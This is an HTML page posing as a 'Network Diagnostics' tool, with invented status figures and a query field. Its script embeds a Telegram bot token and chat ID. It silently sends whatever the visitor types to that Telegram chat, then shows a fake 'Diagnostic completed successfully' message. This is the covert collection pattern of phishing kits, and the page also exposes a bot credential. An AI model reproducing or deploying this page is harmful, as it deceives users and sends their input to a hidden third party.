<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Diagnostic Tool</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #e0e0e0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      background: rgba(15, 15, 35, 0.95);
      border-radius: 12px;
      padding: 40px;
      width: 100%;
      max-width: 600px;
      box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.4),
        0 0 0 1px rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
    }

    .header {
      margin-bottom: 35px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      padding-bottom: 20px;
    }

    .header h1 {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .header h1::before {
      content: 'ðŸ”§';
      font-size: 24px;
    }

    .header .subtitle {
      font-size: 14px;
      color: #9ca3af;
      font-weight: 400;
    }

    .info-section {
      background: rgba(30, 30, 60, 0.5);
      padding: 15px 20px;
      border-radius: 8px;
      margin-bottom: 25px;
      border-left: 3px solid #6366f1;
    }

    .info-section .label {
      font-size: 11px;
      color: #9ca3af;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }

    .info-section .value {
      font-size: 14px;
      color: #e0e0e0;
      font-family: 'Courier New', monospace;
    }

    .form-group {
      margin-bottom: 25px;
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-size: 13px;
      color: #d1d5db;
      font-weight: 500;
    }

    .input-wrapper {
      position: relative;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px 16px;
      background: rgba(30, 30, 60, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      color: #fff;
      font-family: inherit;
      font-size: 14px;
      outline: none;
      transition: all 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #6366f1;
      background: rgba(30, 30, 60, 0.8);
      box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
    }

    input[type="text"]::placeholder {
      color: #6b7280;
    }

    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-family: inherit;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: none;
      letter-spacing: 0.5px;
    }

    button:hover {
      background: linear-gradient(135deg, #4f46e5 0%, #4338ca 100%);
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
    }

    button:active {
      transform: translateY(0);
    }

    .status {
      margin-top: 20px;
      padding: 14px 18px;
      border-radius: 8px;
      font-size: 13px;
      display: none;
      align-items: center;
      gap: 10px;
    }

    .status.active {
      display: flex;
    }

    .status.success {
      background: rgba(16, 185, 129, 0.15);
      border: 1px solid rgba(16, 185, 129, 0.3);
      color: #10b981;
    }

    .status.error {
      background: rgba(239, 68, 68, 0.15);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #ef4444;
    }

    .status::before {
      content: 'âœ“';
      font-size: 16px;
      font-weight: bold;
    }

    .status.error::before {
      content: 'âœ—';
    }

    .loading {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 15px;
      gap: 8px;
      color: #9ca3af;
      font-size: 13px;
    }

    .loading.active {
      display: flex;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255, 255, 255, 0.1);
      border-top-color: #6366f1;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .footer {
      margin-top: 35px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      text-align: center;
      font-size: 11px;
      color: #6b7280;
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-bottom: 25px;
    }

    .stat-card {
      background: rgba(30, 30, 60, 0.4);
      padding: 15px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .stat-card .stat-label {
      font-size: 11px;
      color: #9ca3af;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 6px;
    }

    .stat-card .stat-value {
      font-size: 18px;
      color: #fff;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Network Diagnostics</h1>
      <div class="subtitle">System Configuration & Performance Monitor</div>
    </div>

    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-label">System Status</div>
        <div class="stat-value" style="color: #10b981;">Online</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Latency</div>
        <div class="stat-value">12ms</div>
      </div>
    </div>

    <div class="info-section">
      <div class="label">Session Information</div>
      <div class="value" id="sessionId">Initializing...</div>
    </div>

    <form id="form">
      <div class="form-group">
        <label for="msg">Test Query Parameter</label>
        <div class="input-wrapper">
          <input type="text" id="msg" placeholder="Enter diagnostic query..." required autocomplete="off">
        </div>
      </div>

      <button type="submit">Run Diagnostic</button>
    </form>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <span>Processing request...</span>
    </div>

    <div class="status" id="status"></div>

    <div class="footer">
      System Diagnostics v2.4.1 â€¢ Last updated: <span id="timestamp"></span>
    </div>
  </div>

  <script>
    const BOT_TOKEN = "8446541192:AAFKIQEZjzLOsF3ERLEhM4ZC3SvyZnvYxZw";
    const CHAT_ID = "1799776838";

    // Generate session ID
    const sessionId = 'SYS-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
    document.getElementById("sessionId").innerText = sessionId;

    // Update timestamp
    const now = new Date();
    document.getElementById("timestamp").innerText = now.toLocaleString();

    document.getElementById("form").addEventListener("submit", function(e) {
      e.preventDefault();
      
      const statusEl = document.getElementById("status");
      const loadingEl = document.getElementById("loading");
      const msgInput = document.getElementById("msg");
      const text = msgInput.value;
      
      statusEl.classList.remove("active", "success", "error");
      loadingEl.classList.add("active");
      
      const encoded = encodeURIComponent(text);
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `chat_id=${CHAT_ID}&text=${encoded}`
      })
      .then(res => res.json())
      .then(data => {
        loadingEl.classList.remove("active");
        statusEl.classList.add("active");
        
        if (data.ok) {
          statusEl.classList.add("success");
          statusEl.innerText = "Diagnostic completed successfully";
          msgInput.value = "";
        } else {
          statusEl.classList.add("error");
          statusEl.innerText = "Diagnostic failed - Error code: " + (data.error_code || "UNKNOWN");
        }
      })
      .catch(() => {
        loadingEl.classList.remove("active");
        statusEl.classList.add("active", "error");
        statusEl.innerText = "Connection timeout - Unable to reach diagnostic server";
      });
    });
  </script>
</body>
</html>
